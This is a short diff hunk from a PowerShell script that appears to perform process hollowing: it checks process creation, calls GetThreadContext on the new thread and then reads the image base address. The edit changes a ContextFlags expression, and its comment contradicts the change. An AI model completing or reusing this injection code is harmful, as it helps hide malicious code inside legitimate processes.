@@ -189,7 +189,8 @@ if (!$result) { Write-Error "[-] Failed to create process"; exit }
 
 # Get base address
 $ctx = New-Object Native+CONTEXT64
-$ctx.ContextFlags = (0x100000 -bor 0x1F)  # <-- Fixed bitwise OR with -bor inside parentheses
+$ctx.ContextFlags = 0x100000 -bor 0x1F
+  # <-- Fixed bitwise OR with -bor inside parentheses
 [Native]::GetThreadContext($pi.hThread, [ref]$ctx) | Out-Null
 
 # Read base image address
